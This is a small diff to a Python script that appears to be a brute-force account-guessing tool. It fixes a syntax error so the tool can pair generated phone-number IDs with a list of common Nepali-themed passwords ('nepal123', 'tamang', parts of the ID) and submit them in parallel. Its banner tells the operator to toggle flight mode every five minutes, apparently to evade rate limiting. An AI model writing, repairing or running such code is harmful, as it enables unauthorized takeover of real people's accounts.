@@ -476,7 +476,7 @@ def rndm_nep():
                 fresh();print(f' \x1b[38;5;46mSim Code\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {code}\n\x1b[38;5;196m\x1b[1;97m●\x1b[38;5;196m\x1b[38;5;46m Total Limit\x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m {limit} \n  \x1b[38;5;196m[\x1b[1;97m●\x1b[38;5;196m]\x1b[38;5;46m Use Flight Mode Every 5 Minutes...');line()
                 for love in user:
                         ids = code + love 
-                        pasx = ['nepal123','nepal1234','nepal123456','tamang','nepal','tamang123','nepali','ids,love,ids[3:]]
+                        pasx = ['nepal123','nepal1234','nepal123456','tamang','nepal','tamang123','nepali', ids,love,ids[3:]]
                         Tanim.submit(rndmx,ids,pasx,tl)
 #-----------------------[ RANDOM-METHOD-CODE ]-----------------------#      
 def rndmx(ids,pasx,tl):
